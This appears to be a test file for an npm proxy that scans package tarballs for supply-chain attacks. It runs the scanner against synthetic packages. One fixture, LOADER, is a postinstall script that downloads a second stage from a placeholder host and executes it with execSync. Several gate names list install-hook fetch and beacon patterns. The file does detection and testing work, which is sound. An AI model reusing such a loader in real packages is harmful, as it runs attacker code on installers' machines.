// 0.1.5 tarball static checks, step 3 (design note §3, §5, §9): the TRIGGER and the ROLES. The keep-list walk is armed, per the
// operator ruling of 2026-10-13, by a named WARN row, by the identity-break NOTE, or by the seed's coverage WARN (nothing in the
// finding was evaluated: the brand-new-package case). The registry manifest's main, bin and hooks are remembered with the hook map so
// the keep list is known before the first tarball byte. The five static:* gates are CONTRIBUTING (a WARN is recorded as NOTE; no
// notice, no late event); their rows join the version's decision with MC's in one write, "armed by" in every detail. Not armed is
// stated and retried when a later download is armed (MC's own WARN arms the next one). Tarballs are synthetic; nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks, rememberManifestHooks, manifestHooksFor } from '../../proxy/manifest-check.js';
import { classify } from '../../witness/row-class.js';

const SC = () => import('../../proxy/static-checks.js');
const MC = () => import('../../proxy/manifest-check.js');
const RC = () => import('../../gates/row-class.js');

const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
// tarballs header by header (no tar(1)): package/<name> entries, as the walker tests build them
function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://cdn.example.invalid/stage2", (r) => { let b = ""; r.on("data", (c) => { b += c; }); r.on("end", () => cp.execSync(b)); });\n';
const BENIGN = 'module.exports = 1;\n';
// q: 1.1.0 adds a postinstall in the REGISTRY manifest 48 h after a hookless 1.0.0 -> install-introduced WARN (named) -> armed
// m: the registry manifest declares no hook; the tarball package.json of 1.1.0 does -> MC WARN (named) on the first walk -> arms the next
// p: nothing named, nothing contributing -> not armed
const Q = { name: 'q', 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
  versions: { '1.0.0': { name: 'q', version: '1.0.0', main: 'index.js' }, '1.1.0': { name: 'q', version: '1.1.0', main: 'index.js', scripts: { postinstall: 'node install.js' } } } };
const M = { name: 'm', 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
  versions: { '1.0.0': { name: 'm', version: '1.0.0' }, '1.1.0': { name: 'm', version: '1.1.0' } } };
const P = { name: 'p', 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
  versions: { '1.0.0': { name: 'p', version: '1.0.0', main: 'index.js' }, '1.1.0': { name: 'p', version: '1.1.0', main: 'index.js' } } };
const DOCS = { '/q': Q, '/m': M, '/p': P };
const TARBALLS = {
  '/q/-/q-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(Q.versions['1.1.0']), 'install.js': LOADER, 'index.js': BENIGN }),
  '/m/-/m-1.1.0.tgz': tgz({ 'package.json': JSON.stringify({ name: 'm', version: '1.1.0', scripts: { postinstall: 'node s.js' } }), 'index.js': BENIGN }),
  '/p/-/p-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(P.versions['1.1.0']), 'index.js': BENIGN }),
};
async function withProxy(fn) {
  resetDependencyCache(); forgetManifestHooks();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s3-'));
  const upstream = http.createServer((req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (TARBALLS[u]) { res.writeHead(200, { 'content-type': 'application/octet-stream' }); res.end(TARBALLS[u]); return; }
    if (DOCS[u]) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DOCS[u])); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${upstream.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 10_000 });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  const logs = []; const realErr = console.error; console.error = (m) => logs.push(String(m));
  try { return await fn({ base, proxy, logs }); } finally {
    console.error = realErr;
    await new Promise((r) => proxy.close(r)); await new Promise((r) => upstream.close(r)); fs.rmSync(dir, { recursive: true, force: true });
    resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u, headers = {}) => new Promise((resolve, reject) => http.get(u, { agent: false, headers }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
}).on('error', reject));
const settle = () => new Promise((r) => setTimeout(r, 200));
const rowsOf = (proxy, pkg, v) => proxy.witnessDb.getLatestDecision(pkg, v).gates_fired;
const srow = (proxy, pkg, v, id) => rowsOf(proxy, pkg, v).find((g) => g.gate.startsWith(`static:${id}-`));
const WARN = (gate) => ({ gate, result: 'WARN', detail: 'x' }); const NOTE = (gate) => ({ gate, result: 'NOTE', detail: 'x' });

// ------------------------------------------------------------------ the trigger, the roles, the remembered manifest (pure)
test('U1 armedBy: a named WARN row, the identity-break NOTE, or the seed coverage WARN arms; contributing-only or nothing does not (ruling 2026-10-13)', async () => {
  const S = await SC();
  assert.equal(S.armedBy([WARN('install-introduced'), NOTE('publisher-identity')]), 'named row install-introduced');
  assert.equal(S.armedBy([WARN('install-manifest-mismatch')]), 'named row install-manifest-mismatch');
  assert.equal(S.armedBy([WARN('size-jump-provenance'), WARN('install-introduced')]), 'named rows install-introduced, size-jump-provenance');
  assert.equal(S.armedBy([{ gate: 'seed-v3', result: 'WARN', detail: 'cft-policy-1.2: …', rows: [{ gate: 'seed-v3:channel-a:critical', result: 'WARN' }] }]), 'named row seed-v3:channel-a:critical');
  assert.equal(S.armedBy([NOTE('identity-break'), NOTE('size-jump')]), 'identity-break');
  assert.equal(S.armedBy([{ gate: 'seed-v3', result: 'WARN', detail: 'cft-policy-1.2: …', rows: [{ gate: 'seed-v3:coverage', result: 'WARN' }] }]), 'seed coverage WARN (nothing in the finding was evaluated)');
  assert.equal(S.armedBy([NOTE('publisher-identity'), NOTE('size-jump'), { gate: 'install-introduced', result: 'ALLOW', detail: 'x' }]), null, 'contributing rows other than identity-break do not arm');
  assert.equal(S.armedBy([{ gate: 'seed-v3', result: 'SKIP', detail: 'x', rows: [{ gate: 'seed-v3:coverage', result: 'SKIP' }] }]), null, 'a stale-seed SKIP is not the coverage WARN');
  assert.equal(S.armedBy([WARN('publisher-identity')]), null, 'a WARN from a contributing gate the role table has not yet turned is not named');
  assert.equal(S.armedBy([]), null); assert.equal(S.armedBy(null), null); assert.equal(S.armedBy([null, 7, { gate: 3 }]), null);
  assert.equal(S.MAX_ARMED_WALKS, 16);   // 0.1.6: every download is walked, so the ceiling is npm's 16 connections (declared)
});

test('U2 roles: S1-S4 are contributing (S0 and S5 named 2026-10-15, cft015-s9; S6 and S7 named 2026-10-22, cft015-named-s6-s7; declared); a contributing static WARN is recorded as NOTE; MC stays named', async () => {
  const R = await RC(); const S = await SC();
  const NAMED = ['static:S0-shell-fetch-in-hook', 'static:S5-oversized-hook-target', 'static:S6-network-beacon-in-hook-target', 'static:S7-entry-capability-gain', 'static:S8-prebuilt-addon-dropper-in-hook', 'static:S9-hidden-script-in-gyp-build'];   // S8, S9: 1.8 (declared)
  for (const g of S.STATIC_GATES) assert.equal(R.CONTRIBUTING_GATES.has(g), !NAMED.includes(g), g);
  assert.equal(R.withRole({ gate: 'static:S1-loader-in-hook-target', result: 'WARN', detail: 'd' }).result, 'NOTE');
  assert.equal(R.withRole({ gate: 'static:S2-obfuscated-entry', result: 'SKIP', detail: 'd' }).result, 'SKIP');
  assert.equal(R.withRole({ gate: 'install-manifest-mismatch', result: 'WARN', detail: 'd' }).result, 'WARN');
  assert.deepEqual(classify([{ gate: 'static:S1-loader-in-hook-target', result: 'NOTE', detail: 'd' }]).contributing, ['static:S1-loader-in-hook-target']);
});

test('U3 the hook map also remembers main and bin: manifestEntryFor gives the keep list its source before the first tarball byte', async () => {
  const M2 = await MC();
  forgetManifestHooks();
  rememberManifestHooks('k', { '1.0.0': { name: 'k', version: '1.0.0', main: 'lib/a.js', bin: { a: 'bin/a', b: 'bin/b', c: 'bin/c', d: 'bin/d', e: 'bin/e' }, scripts: { postinstall: 'node i.js', test: 'x' } }, '1.0.1': { name: 'k', version: '1.0.1' } });
  assert.deepEqual(M2.manifestEntryFor('k', '1.0.0'), { main: 'lib/a.js', bin: { a: 'bin/a', b: 'bin/b', c: 'bin/c', d: 'bin/d' }, scripts: { postinstall: 'node i.js' } });
  assert.deepEqual(M2.manifestEntryFor('k', '1.0.1'), { main: null, bin: null, scripts: {} });
  assert.equal(M2.manifestEntryFor('k', '9.9.9'), undefined); assert.equal(M2.manifestEntryFor('zz', '1.0.0'), undefined);
  assert.deepEqual(manifestHooksFor('k', '1.0.0'), { postinstall: 'node i.js' }, 'MC\'s view is unchanged');
  rememberManifestHooks('k2', { '1.0.0': { main: 'x'.repeat(500), bin: 'cli.js' } });
  assert.equal(M2.manifestEntryFor('k2', '1.0.0').main.length, 200, 'publisher text bounded'); assert.equal(M2.manifestEntryFor('k2', '1.0.0').bin, 'cli.js');
  forgetManifestHooks(); assert.equal(M2.manifestEntryFor('k', '1.0.0'), undefined);
});

test('U4 "armed by" rides every row; staticSettled tells a final outcome from one to retry when a later download is armed', async () => {
  const S = await SC();
  const walk = { ok: true, packageJson: null, views: [], approx: [], files: [{ path: 'index.js', buf: Buffer.from(BENIGN), name: 'package/index.js', platformsNotChecked: [] }], notKept: [] };
  const rows = S.staticRows({ manifest: { main: 'index.js' }, packageJson: { main: 'index.js' }, walk, armed: 'named row install-introduced' });
  for (const r of rows) assert.ok(r.detail.endsWith('; armed by named row install-introduced'), r.detail);
  assert.equal(S.staticSettled({ gates_fired: rows }), true);
  const unarmed = S.unarmedRows('no named row, no identity-break, no entry-path-change, no coverage gap');
  assert.deepEqual(unarmed.map((r) => r.gate), S.STATIC_GATES);
  for (const r of unarmed) { assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: not armed (no named row, no identity-break, no entry-path-change, no coverage gap)'); }
  assert.equal(S.staticSettled({ gates_fired: unarmed }), false);
  assert.equal(S.staticSettled({ gates_fired: S.unarmedRows('concurrency ceiling: 4 armed walks in flight') }), false);
  assert.equal(S.staticSettled({ gates_fired: S.noManifestRows('named row install-introduced') }), false);
  assert.equal(S.noManifestRows('x')[0].detail, 'not checked: no registry manifest at hand; armed by x');
  assert.equal(S.staticSettled({ gates_fired: rows.slice(0, 4) }), false, 'all five rows or nothing');
  assert.equal(S.staticSettled({ gates_fired: [] }), false); assert.equal(S.staticSettled(null), false);
  const skipFinal = S.staticRows({ manifest: { main: 'index.js' }, packageJson: null, walk: { ok: false, reason: 'tar: truncated archive' }, armed: 'x' });
  assert.equal(S.staticSettled({ gates_fired: skipFinal }), true, 'a walk that failed is final: the tarball is immutable');
});

// ------------------------------------------------------------------ through the proxy
test('E1 armed by install-introduced: the first download records S1 as NOTE beside MC, "armed by" in the detail; no notice, no late event; no second walk', async () => {
  await withProxy(async ({ base, proxy, logs }) => {
    await get(`${base}/q`, { 'npm-session': 's3e1' });
    const t = await get(`${base}/q/-/q-1.1.0.tgz`, { 'npm-session': 's3e1' });
    assert.equal(t.status, 200); assert.ok(t.body.equals(TARBALLS['/q/-/q-1.1.0.tgz']));
    await settle();
    const s1 = srow(proxy, 'q', '1.1.0', 'S1');
    assert.equal(s1?.result, 'NOTE', JSON.stringify(rowsOf(proxy, 'q', '1.1.0')));
    assert.equal(s1.detail, 'hook target install.js (211 B) has a network sink (http-request, url-literal) and an execution sink (child_process); armed by named row install-introduced');
    assert.equal(srow(proxy, 'q', '1.1.0', 'S0').detail, 'install hooks carry no fetch-and-execute; armed by named row install-introduced');
    assert.equal(srow(proxy, 'q', '1.1.0', 'S2').result, 'ALLOW', JSON.stringify(rowsOf(proxy, 'q', '1.1.0').filter((g) => g.gate.startsWith('static:'))));
    const mc = rowsOf(proxy, 'q', '1.1.0').find((g) => g.gate === 'install-manifest-mismatch'); assert.equal(mc.result, 'ALLOW');
    const latest = proxy.witnessDb.getLatestDecision('q', '1.1.0');
    assert.equal(latest.disposition, 'WARN', 'install-introduced, as before');
    assert.deepEqual(classify(latest.gates_fired).contributing, ['static:S1-loader-in-hook-target']);
    assert.ok(!logs.some((l) => /static:S1/.test(l) && /WARN named/.test(l)), 'a contributing row is never a named late event');
    assert.ok(!proxy.witnessDb.listNamedFactEvents().some((r) => /static/.test(JSON.stringify(r))));
    const n = proxy.witnessDb.getDecisionHistory('q', '1.1.0').length;
    const t2 = await get(`${base}/q/-/q-1.1.0.tgz`); await settle();
    assert.equal(proxy.witnessDb.getDecisionHistory('q', '1.1.0').length, n, 'settled: no second walk');
    assert.match(t2.headers['npm-notice'] ?? '', /install-introduced|install script/i, 'the notice is install-introduced\'s, unchanged');
  });
});

// 0.1.6 every download is walked (deliberate change of expectation): E2 and E3 were "not armed" on the first download
test('E2 nothing arms the download: it is walked anyway and every static row names "every download", which chaingate why can show', async () => {
  await withProxy(async ({ base, proxy }) => {
    await get(`${base}/p`); await get(`${base}/p/-/p-1.1.0.tgz`); await settle();
    const mc = rowsOf(proxy, 'p', '1.1.0').find((g) => g.gate === 'install-manifest-mismatch'); assert.equal(mc?.result, 'ALLOW');
    for (const id of ['S0', 'S1', 'S2', 'S3', 'S4']) { const r = srow(proxy, 'p', '1.1.0', id); assert.ok(r, id); assert.doesNotMatch(r.detail, /^not checked: not armed/, id); assert.match(r.detail, /; armed by every download$/, id); }
    assert.equal(proxy.witnessDb.getLatestDecision('p', '1.1.0').disposition, 'ALLOW');
    const n = proxy.witnessDb.getDecisionHistory('p', '1.1.0').length;
    await get(`${base}/p/-/p-1.1.0.tgz`); await settle();
    assert.equal(proxy.witnessDb.getDecisionHistory('p', '1.1.0').length, n, 'settled: no second walk');
  });
});

test('E3 MC\'s WARN and the static rows come from the FIRST download\'s walk; the second download carries MC\'s notice and walks nothing', async () => {
  await withProxy(async ({ base, proxy }) => {
    await get(`${base}/m`); await get(`${base}/m/-/m-1.1.0.tgz`); await settle();
    assert.equal(rowsOf(proxy, 'm', '1.1.0').find((g) => g.gate === 'install-manifest-mismatch').result, 'WARN');
    const s1 = srow(proxy, 'm', '1.1.0', 'S1');
    assert.equal(s1.result, 'SKIP'); assert.equal(s1.detail, 'not checked: s.js named by the tarball package.json only (not kept); armed by every download');   // the runtime has no inventory, so it states what it knows
    assert.equal(srow(proxy, 'm', '1.1.0', 'S2').detail, 'entry files carry no obfuscation marker pair (1 file read); armed by every download');
    const n1 = proxy.witnessDb.getDecisionHistory('m', '1.1.0').length;
    const t2 = await get(`${base}/m/-/m-1.1.0.tgz`); await settle();
    assert.match(t2.headers['npm-notice'], /install scripts differ/, 'MC\'s notice on the second download, as before');
    assert.equal(proxy.witnessDb.getDecisionHistory('m', '1.1.0').length, n1, 'settled on the first walk: no second walk');
    assert.equal(rowsOf(proxy, 'm', '1.1.0').find((g) => g.gate === 'install-manifest-mismatch').result, 'WARN', 'MC\'s row rides along unchanged');
    const n2 = proxy.witnessDb.getDecisionHistory('m', '1.1.0').length;
    await get(`${base}/m/-/m-1.1.0.tgz`); await settle();
    assert.equal(proxy.witnessDb.getDecisionHistory('m', '1.1.0').length, n2, 'settled');
  });
});
